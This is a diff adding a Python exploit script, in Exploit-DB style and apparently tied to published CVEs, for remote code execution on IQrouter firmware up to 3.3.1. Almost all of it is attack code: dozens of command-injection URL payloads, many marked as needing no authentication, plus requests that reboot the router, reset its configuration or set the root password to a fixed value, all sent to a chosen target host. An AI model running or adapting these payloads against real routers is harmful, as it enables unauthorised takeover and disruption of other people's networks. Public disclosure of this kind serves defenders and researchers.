@@ -1,0 +1,339 @@
+# Exploit Title: IQrouter 3.3.1 Firmware - Remote Code Execution
+# Date: 2020-04-21
+# Exploit Author: drakylar
+# Vendor Homepage: https://evenroute.com/
+# Software Link: https://evenroute.com/iqrouter
+# Version: IQrouter firmware up to 3.3.1
+# Tested on: IQrouter firmware 3.3.1
+# CVE : N/A 
+
+#!/usr/bin/env python3
+import argparse
+from sys import argv, exit
+
+try:
+    import requests
+except ImportError:
+    print("Install requests lib! pip3 install requests")
+
+
+print("""
+#######################################################################
+#           IQrouter multiple RCE and other vulnerabilities           #
+#                   by drakylar (Shaposhnikov Ilya)                   #
+#            CVE-2020-11963 CVE-2020-11964 CVE-2020-11966             #
+#                    CVE-2020-11967 CVE-2020-11968                    #
+#######################################################################
+""")
+
+
+rce_setup = [
+    [
+        "/cgi-bin/luci/er/vlanTag?vlan_tag='`{}`'",
+        "RCE /vlanTag (vlan_tag param)"
+    ],
+    [
+        "/cgi-bin/luci/er/verify_wifi?wifi_conflict='`{}`'",
+        "RCE /verify_wifi (wifi_conflict param). Need hide_wifi_config != true"
+    ],
+    [
+        "/cgi-bin/luci/er/screen9?save_creds=1&s1&s2='`{}`'&p1&p2",
+        "RCE /screen9 (s2 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen9?save_creds=1&s1='`{}`'&s2&p1&p2",
+        "RCE /screen9 (s1 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen9?save_creds=1&s1&s2&p1&p2='`{}`'",
+        "RCE /screen9 (p2 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen9?save_creds=1&s1&s2&p1='`{}`'&p2",
+        "RCE /screen9 (p1 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen4?save_isp='`{}`",
+        "RCE /screen4 (save_isp param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen2?set_wan_modem_interfaces='`{}`'",
+        "RCE /screen2 set_wan_modem_interfaces param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen2?find_ip_address_conflict='`{}`'",
+        "RCE /screen2 find_ip_address_conflict param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen10?set_security_question='`{}`'",
+        "RCE /screen10 (set_security_question param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen10?set_security_answer='`{}`'&set_security_question=1",
+        "RCE /screen10 (set_security_answer param)"],
+    [
+        "/cgi-bin/luci/er/screen1?zonename='`{}`'",
+        "RCE /screen1 (zonename param)"
+    ],
+    [
+        "/cgi-bin/luci/er/register?email=`{}`",
+        "RCE /register (email param, result in /cgi-bin/luci/er/get_syslog for result)"
+    ]
+]
+
+rce_any = [
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=1&s2='`{}`'&p1=1&p2=1",
+        "RCE /wifi (s2 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1='`{}`'&s2=5&p1=6&p2=7",
+        "RCE /wifi (s1 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=1&s2=2&p1=3&p2='`{}`'",
+        "RCE /wifi (p2 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=1&s2=2&p1='`{}`'&p2=4",
+        "RCE /wifi (p1 param)"
+    ],
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=`{}`&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=4&s2=5&p1=6&p2=7",
+        "RCE /wifi (guestwifi_5g_ssid param)"
+    ],
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=`{}`&guestwifi_5g_ssid=3&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=4&s2=5&p1=6&p2=7",
+        "RCE /wifi (guestwifi_2g_ssid param)"
+    ],
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi=1&guest_key='`{}`'&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=2&guestwifi_5g_ssid=3&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=4&s2=5&p1=6&p2=7",
+        "RCE /wifi (guest_key param)"
+    ],
+    [
+        "/cgi-bin/luci/er/wifi?enable_guestwifi='`{}`'&guest_key=2&disable_guestwifi=1&connection_test=1&disassociate_low_ack_update=1&guestwifi_2g_ssid=3&guestwifi_5g_ssid=4&get_network_details=1&switch_reset_wifi_mode=1&save_creds=1&s1=5&s2=6&p1=6&p2=7",
+        "RCE /wifi (enable_guestwifi param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen11.1?email=`{}`&register=123&uilog=123&bg=123",
+        "RCE /screen11.1 (email param)"
+    ],
+    [
+        "/cgi-bin/luci/er/reboot_link?link='`{}`'",
+        "RCE /reboot_link (link param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_wifi/1/2/3/4/5/'`{}`'/",
+        "RCE /diag_wifi (htm5ghz param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_wifi/1/2/3/4/'`{}`'/6/",
+        "RCE /diag_wifi (htm2ghz param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_wifi/1/2/3/'`{}`'/5/6/",
+        "RCE /diag_wifi (c5ghz param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_wifi/1/2/'`{}`'/4/5/6/",
+        "RCE /diag_wifi (c2ghz param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_static_wan/'`{}`'/2/3/4/",
+        "RCE /diag_set_static_wan (static_ip param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_static_wan/1/'`{}`'/3/4/",
+        "RCE /diag_set_static_wan (net_mask param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_static_wan/1/2/'`{}`'/4/",
+        "RCE /diag_set_static_wan (gateway param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_static_wan/1/2/3/'`{}`'/",
+        "RCE /diag_set_static_wan (dns param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_static_modem/'`{}`'/2/3/",
+        "RCE /diag_set_static_modem (static_ip param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_static_modem/1/'`{}`'/3/",
+        "RCE /diag_set_static_modem (net_mask param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_static_modem/1/2/'`{}`'/",
+        "RCE /diag_set_static_modem (gateway param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_device_name_and_sync/'`{}`'/",
+        "RCE /diag_set_device_name_and_sync (device_name param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_device_name/'`{}`'/",
+        "RCE /diag_set_device_name (device_name param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoe_update/'`{}`'/passs/",
+        "RCE /diag_pppoe_update (wan_username param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoe_update/aaadmin/'`{}`'/",
+        "RCE /diag_pppoe_update (wan_password param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoe/'`{}`'/passsswd/",
+        "RCE /diag_pppoe (wan_username param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoe/aaadmin/'`{}`'/",
+        "RCE /diag_pppoe (wan_password param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoa_update/'`{}`'/paaaasword/",
+        "RCE /diag_pppoa_update (wan_username param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoa_update/aaadmin/'`{}`'/",
+        "RCE /diag_pppoa_update (wan_password param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoa/'`{}`'/passs/",
+        "RCE /diag_pppoa (wan_username param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_pppoa/aaadmin/'`{}`'/",
+        "RCE /diag_pppoa (wan_password param)"
+    ],
+    [
+        "/cgi-bin/luci/er/advanced_link?link='`{}`'",
+        "RCE /advanced_link (link param)"
+    ]
+
+]
+
+advanced_payloads = [
+    [
+        "/cgi-bin/luci/er/reboot_link?reboot=1",
+        "Reboot IQrouter (/reboot_link reboot param))"
+    ],
+    [
+        "/cgi-bin/luci/er/screen2?reboot=1",
+        "Reboot IQrouter (/screen2 reboot param))"
+    ],
+    [
+        "/cgi-bin/luci/er/index?reset_config=1",
+        "Reset IQrouter (/index reset_config param)"
+    ],
+    [
+        "/cgi-bin/luci/er/screen7?upgrade=1",
+        "Upgrade IQrouter (/screen7 upgrade param)"
+    ],
+    [
+        "/cgi-bin/luci/er/vlanTag?restart_network=1",
+        "Restart network (/vlanTag restart_network param)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_iperf_cmd/start",
+        "Start iperf script (/diag_iperf_cmd/start)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_iperf_cmd/stop",
+        "Stop iperf script (/diag_iperf_cmd/stop)"
+    ],
+    [
+        "/cgi-bin/luci/er/get_syslog",
+        "Router setup info log (/get_syslog)"
+    ],
+    [
+        "/cgi-bin/luci/er/diag_set_password/c00lpasswd/",
+        "Change root password to c00lpasswd (can change in code)"
+    ],
+    [
+        "/cgi-bin/luci/er/reset_password/",
+        "Change root password to 'changeme' (static)"
+    ]
+]
+
+
+def print_payloads():
+    print('#' * 30)
+    print("Payloads list")
+    num = 1
+    print('#########################  RCE without auth  ########################')
+    for payload in rce_any:
+        print("{} - {}".format(num, payload[1]))
+        num += 1
+
+    print(
+        '###############  RCE (router need to be in setup mode)  ###############')
+    for payload in rce_setup:
+        print("{} - {}".format(num, payload[1]))
+        num += 1
+
+    print(
+        '#########################  Advanced payloads  #########################')
+    for payload in advanced_payloads:
+        print("{} - {}".format(num, payload[1]))
+        num += 1
+
+
+parser = argparse.ArgumentParser(description="IQrouter multiple RCE")
+parser.add_argument('--host', help='Host', type=str)
+parser.add_argument('-p', '--port', help='Web port (default: 80)', default=80, type=int)
+parser.add_argument('-n', '--num', help='Payload number',
+                    default=0, type=int)
+parser.add_argument('-c', '--cmd', help='Command to execute (default: pwd)',
+                    default="pwd", type=str)
+parser.add_argument('--protocol', help='Protocol (http/https)',
+                    default="http", type=str)
+
+args = parser.parse_args()
+
+
+def main():
+    print("")
+    full_payload_list = rce_setup + rce_any + advanced_payloads
+    payloads_amount = len(full_payload_list)
+    try:
+        hostname = args.host
+        port = args.port
+        payload_num = int(args.num)
+        bash_cmd = args.cmd
+        protocol = args.protocol
+
+        if payload_num < 1 or payload_num > payloads_amount:
+            print("Error with payload number!")
+            raise IndexError
+        if port < 0 or port > 65535:
+            print("Error with port number")
+            raise IndexError
+        if protocol not in ['http', 'https']:
+            print("Error with protocol name")
+            raise IndexError
+
+        current_payload = full_payload_list[payload_num - 1]
+        print("Payload: {}".format(current_payload[1]))
+        print("Host: {}".format(hostname))
+        print("Port: {}".format(port))
+        print("Protocol: {}".format(protocol))
+        print("Command: {}".format(bash_cmd))
+
+        full_url = "{}://{}:{}{}".format(protocol, hostname, port,
+                                         current_payload[0].format(bash_cmd))
+        print("Built URL: {}".format(full_url))
+
+        r = requests.get(full_url)
+        print("Status code: {}".format(r.status_code))
+        return
+    except IndexError:
+        parser.print_help()
+        print_payloads()
+        exit(1)
+
+
+if __name__ == '__main__':
+    print(
+        "\n\nWarning: use TABS(doesn't work in some payloads) or ${IFS} for space.")
+    exit(main())
